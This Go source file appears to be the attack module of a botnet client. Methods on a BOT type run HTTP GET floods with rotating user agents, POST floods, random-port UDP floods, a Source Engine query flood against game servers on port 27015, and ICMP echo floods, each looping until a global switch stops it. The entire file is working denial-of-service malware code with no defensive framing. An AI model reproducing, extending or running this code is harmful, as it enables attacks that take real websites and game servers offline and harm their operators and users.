package pkg

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var AttackSwitch bool

func (bot *BOT) GET(getTarget string) {
	agentSlice := []string{
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
	}
	getRequest, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
	if err != nil {
		bot.Report(err.Error())
	}
	get := &http.Client{}

	for {
		for i := range agentSlice {
			getRequest.Header.Set("User-Agent", agentSlice[i])
			get.Do(getRequest)
		}
		if AttackSwitch {
			break
		}
	}
}

func (bot *BOT) POST(postTarget string) {
	buffer := make([]byte, 50)
	reqBody, _ := json.Marshal(map[string]string{
		"email":    string(buffer),
		"user":     string(buffer),
		"password": string(buffer),
	})
	postRequest, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
	if err != nil {
		bot.Report(err.Error())
	}
	post := &http.Client{}

	for {
		post.Do(postRequest)
		if AttackSwitch {
			break
		}
	}
}

func (bot *BOT) udpPacketCraft(udpTarget, port string, buffer []byte) {
	udp, err := net.Dial("udp", udpTarget+":"+port)
	if err != nil {
		bot.Report(err.Error())
	}
	udp.Write(buffer)
	udp.Close()
}

func (bot *BOT) DUDP(udpTarget, packetSize string) {
	for {
		size, _ := strconv.Atoi(packetSize)
		if size < 100 || size > 700 {
			size = 700
		}
		dudpBuff := make([]byte, size)
		bot.udpPacketCraft(udpTarget, fmt.Sprint(rand.Intn(65535)), dudpBuff)
		if AttackSwitch {
			break
		}
	}
}

func (bot *BOT) VSE(vseTarget string) {
	for {
		vseBuff := []byte("TSource Engine Query")
		bot.udpPacketCraft(vseTarget, "27015", vseBuff)
		if AttackSwitch {
			break
		}
	}
}

func (bot *BOT) ICMP(icmpTarget string) {
	conn, err := icmp.ListenPacket("udp4", "0.0.0.0")
	if err != nil {
		bot.Report(err.Error())
	}
	defer conn.Close()

	buffer := make([]byte, 1450)
	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: []byte(buffer),
		},
	}

	for {
		wb, _ := wm.Marshal(nil)
		conn.WriteTo(wb, &net.UDPAddr{IP: net.ParseIP(icmpTarget)})
		if AttackSwitch {
			break
		}
	}
}
